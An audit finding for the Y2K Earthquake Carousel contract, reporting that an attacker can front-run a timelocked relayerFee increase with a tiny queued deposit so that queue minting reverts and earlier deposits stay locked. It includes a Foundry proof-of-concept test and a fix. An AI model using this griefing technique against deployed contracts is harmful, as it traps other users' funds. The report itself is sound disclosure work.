# increasing `relayerFee` is dangerous

## Summary
Increasing `relayerFee` can be dangerous since a malicious person could see this and register a deposit with the old relayer fee that cannot be executed when the fee is created.

## Vulnerability Detail
When queuing a deposit `Carousel` checks if the despit is greater than the relayer fee:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L87
and
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L739-L742

However the owner can increase the `relayerFee` because gas prices might have increased. The owner must declare this in advance so an attacker can see this being queued in TimeLock and just before it is executed register a deposit into the queue for the old `relayerFee` + 1.

When this is executed it will revert on underflow:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L334-L338

If there already were deposits queued, since the deposits is a stack, the ones that were before will never be executed and their funds will be locked in the contract forever.

PoC test in `CarouselTest.t.sol`:
```solidity
    function testDepositIntoQueueRelayerFeeChange() public {
        // test multiple deposits into queue
        uint40 _epochBegin = uint40(block.timestamp + 1 days);
        uint40 _epochEnd = uint40(block.timestamp + 2 days);
        uint256 _epochId = 2;
        uint256 _emissions = 100 ether;

        deal(emissionsToken, address(vault), 100 ether, true);
        vault.setEpoch(_epochBegin, _epochEnd, _epochId);
        vault.setEmissions( _epochId, _emissions);

        // some existing deposits are queued
        helperDepositInEpochs(_epochId,USER, true);
        helperDepositInEpochs(_epochId,USER2, true);
        helperDepositInEpochs(_epochId,USER3, true);
        helperDepositInEpochs(_epochId,USER4, true);
        helperDepositInEpochs(_epochId,USER5, true);

        vm.startPrank(USER6);
        IERC20(UNDERLYING).approve(address(vault), 10 ether);
        vault.deposit(0, vault.relayerFee() + 1, USER6); // queue a deposit as small as possible
        vm.stopPrank();

        assertEq(vault.getDepositQueueLenght(), 6);

        // relayer fee is changed
        vault.changeRelayerFee(3 gwei);

        // mint deposit in queue cant be done becaues the top item causes revert
        vm.expectRevert();
        vault.mintDepositInQueue(_epochId, 6);

        // all previous items are stuck in the queue
        assertEq(vault.getDepositQueueLenght(), 6);
    }
```

## Impact
If `relayerFee` is increased an attacker can intentionally break the deposit queue locking any previously queued deposits into the contract.

## Tool used
Manual Review

## Recommendation
I recommend adding a check that the amount is greater than relayer fee when minting deposits. If amount minted is less than the relayerFee use the whole amount as relayerFee:

That would remove this attack vector as they effectively at time of minting would just pay the old relayer fee and get no shares.
